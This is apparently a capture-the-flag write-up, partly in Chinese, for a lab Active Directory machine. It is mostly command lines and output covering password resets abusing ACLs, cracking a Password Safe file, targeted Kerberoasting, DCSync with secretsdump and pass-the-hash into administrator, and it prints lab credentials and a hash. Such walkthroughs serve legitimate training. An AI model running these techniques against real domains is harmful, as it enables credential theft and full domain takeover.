Phase 1

横向移动：链式密码重置

Olivia → Michael（GenericAll）

$ net rpc password "michael" "Password123-" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.5.126
$ netexec smb 10.129.5.126 -u michael -p 'Password123-'
[+] administrator.htb\michael:Password123-

Michael → Benjamin（ForceChangePassword）

$ net rpc password "benjamin" "Password123-" -U "administrator.htb"/"michael"%"Password123-" -S 10.129.5.126
Phase 2

FTP → Password Safe → Emily

$ ftp 10.129.5.126
user: benjamin / pass: Password123-
ftp> get Backup.psafe3

$ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
tekieromucho

$ pwsafe Backup.psafe3
emily → UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Password Safe v3.psafe3 是 Password Safe 的加密数据库。hashcat -m 5200 破解主密码后用 pwsafe 打开。数据库中三个用户（alexander/emily/emma），只有 emily 的凭据在域中有效。
$ evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
*Evil-WinRM* PS > type user.txt
Phase 3

Targeted Kerberoasting：Emily → Ethan

🧒 儿童版 — 挂假服务牌号普通用户没有 SPN，Kerberoasting 抓不到。但 Emily 有 GenericWrite 权限，可以给 Ethan 强行挂一个假 SPN。挂上后请求 TGS 票据，拿回来离线暴力破解。
$ sudo ntpdate administrator.htb
$ python3 targetedKerberoast.py -d administrator.htb -u emily \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.5.126 --request-user ethan
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$...

$ hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
limpbizkit
Phase 4

DCSync → Pass-the-Hash → Domain Admin

🧒 儿童版 — 假装域控偷哈希DCSync 就是假装自己是另一台域控，对真正的域控说"嘿，把所有用户的密码哈希同步给我一份"——域控信以为真，就把 Administrator 的哈希交出来了。
$ impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.129.5.126'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::

$ evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
*Evil-WinRM* PS > type root.txt
附录

知识点总结

GenericAll = 上帝权限。

可以重置密码、修改属性、修改 ACL。

ForceChangePassword。

不知道原密码也能重置。net rpc password。

Targeted Kerberoasting。

GenericWrite → 给目标设 SPN → 请求 TGS → 离线破解。比普通 Kerberoasting 多一步"挂 SPN"。

DCSync。

模拟域控复制协议提取 NTLM 哈希。需要 Replicating Directory Changes 权限。impacket-secretsdump。

Hashcat 速记。

-m 5200 Password Safe v3 · -m 13100 Kerberos TGS-REP etype 23。
